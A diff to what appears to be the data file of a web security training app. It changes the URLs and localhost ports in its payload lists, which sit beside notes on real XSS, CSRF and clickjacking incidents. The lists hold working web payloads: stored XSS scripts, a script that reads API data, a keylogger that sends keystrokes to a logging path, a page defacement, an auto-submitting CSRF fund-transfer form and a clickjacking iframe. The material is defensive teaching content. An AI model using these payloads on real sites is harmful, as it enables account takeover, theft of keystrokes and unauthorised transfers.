@@ -126,7 +126,7 @@ output = html.escape(q)   # < → &lt;  > → &gt;
     },
     payloads: [
       { code: "<script>alert('stored XSS by '+document.domain)</script>", desc: "Confirm stored XSS fires on page load" },
-      { code: "<script>fetch('http://localhost:5000/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", desc: "Exfil API data via stored payload" },
+      { code: "<script>fetch('/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", desc: "Exfil API data via stored payload" },
       { code: "<script>document.onkeypress=e=>fetch('//log?k='+e.key)</script>", desc: "Keylogger — captures everything typed on page" },
       { code: "<img src=x onerror=\"document.body.innerHTML='<h1 style=color:red>HACKED</h1>'\">", desc: "Full page defacement" },
     ],
@@ -198,7 +198,7 @@ row = conn.execute(
       text: "CSRF used to transfer funds out of ING Direct accounts. Attacker hosted page that auto-submitted transfer forms — victims just needed to visit the page while logged in. Same year, CSRF on YouTube allowed arbitrary actions on any user's account. <strong>No malware needed — just a browser.</strong>",
     },
     payloads: [
-      { code: '<form action="//localhost:5000/csrf/transfer?safe=0" method=POST>', desc: "Attack form targeting the transfer endpoint" },
+      { code: '<form action="//localhost:5005/csrf/transfer?safe=0" method=POST>', desc: "Attack form targeting the transfer endpoint" },
       { code: '<input name="to_user" value="attacker">', desc: "Recipient — attacker's account" },
       { code: '<input name="amount" value="9999">', desc: "Amount — maximum" },
       { code: 'document.forms[0].submit()', desc: "Auto-submit on page load — victim sees nothing" },
@@ -379,8 +379,8 @@ result = f"Hello, {name}!"
       text: "Missing X-Frame-Options allowed clickjacking attacks that tricked users into clicking hidden 'Like' and 'Retweet' buttons. Called 'likejacking' — millions of posts spread automatically. <strong>Simple iframe trick, no code execution needed.</strong> Fixed with one HTTP header.",
     },
     payloads: [
-      { code: "curl -I http://localhost:5000/headers?safe=0", desc: "See missing headers in vulnerable mode" },
-      { code: "curl -I http://localhost:5000/headers?safe=1", desc: "See all security headers in safe mode" },
+      { code: "curl -I http://localhost:5005/headers?safe=0", desc: "See missing headers in vulnerable mode" },
+      { code: "curl -I http://localhost:5005/headers?safe=1", desc: "See all security headers in safe mode" },
       { code: '<iframe src="//target.com" opacity="0.001">', desc: "Clickjacking PoC — works without X-Frame-Options" },
       { code: "securityheaders.com / observatory.mozilla.org", desc: "Online scanner for production sites" },
     ],
